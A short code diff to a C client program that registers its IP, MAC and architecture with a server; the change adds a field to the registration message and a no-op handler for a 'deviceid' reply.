@@ -114,7 +114,7 @@ int main(int argc, char * argv[])
 		return 1;
 	}
 
-	bytes = snprintf(buffer, 1024, "newmd %s %s %s\n", myIP, myMAC, myArchitecture);
+	bytes = snprintf(buffer, 1024, "newmd %s %s %s 9|1|112|%s\n", myIP, myMAC, myArchitecture, myArchitecture);
 	write(s, buffer, bytes < 1024 ? bytes : 1024);
 	
 	close(s);
@@ -147,6 +147,11 @@ int main(int argc, char * argv[])
 				printf("%s\n", "Running a shell");
 				system("/bin/sh");
 				printf("\n%s\n", "Shell exited");
+			}
+			else if (strcmp(cmd, "deviceid") == 0)
+			{
+				// NOOP
+				// Server reported back to us our ID
 			}
 		}
 		
